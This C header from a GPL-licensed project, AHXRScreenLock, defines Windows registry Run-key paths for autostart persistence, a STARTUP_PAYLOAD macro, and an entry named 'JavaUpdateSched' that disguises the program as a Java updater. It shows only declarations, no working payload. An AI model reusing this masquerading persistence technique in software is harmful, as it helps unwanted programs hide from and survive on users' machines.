/*
	@title
		AHXRScreenLock
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2017

	AHXRScreenLock is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	AHXRScreenLock is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
#define KEY_TARGET						HKEY_LOCAL_MACHINE
#define KEY_NON_ADMIN_TARGET			HKEY_CURRENT_USER
#define KEY_STARTUP						"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define KEY_NON_ADMIN_STARTUP			"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define KEY_VALUE_NAME					"JavaUpdateSched"

#define	STARTUP_PAYLOAD()				{createStartupData();}

extern void								createStartupData();
extern bool								isStartupRegistered();